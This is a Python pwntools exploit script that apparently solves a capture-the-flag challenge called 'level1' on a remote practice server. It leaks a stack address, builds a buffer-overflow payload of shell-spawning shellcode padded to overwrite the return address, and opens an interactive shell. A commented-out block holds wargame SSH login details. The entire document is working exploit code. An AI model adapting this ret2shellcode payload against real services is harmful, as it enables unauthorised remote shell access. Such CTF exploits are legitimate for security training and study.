#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./level1")
	
else:
	#pwn2.jarvisoj.com 9881
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("pwn2.jarvisoj.com","9877")
#gdb.attach(io,"b *0x0000065B")
#context.log_level = "debug"
shellcode = asm(shellcraft.sh())
io.recvuntil("What's this:")
#print io.recvuntil("?").strip("?")
shellcode_addr = int(io.recvuntil("?").strip("?"),16)
payload = ""
payload += shellcode.ljust(0x88,'A')# 覆盖ret
payload += "junk"
payload += p32(shellcode_addr)# 覆盖ret
io.sendline(payload)
io.interactive()
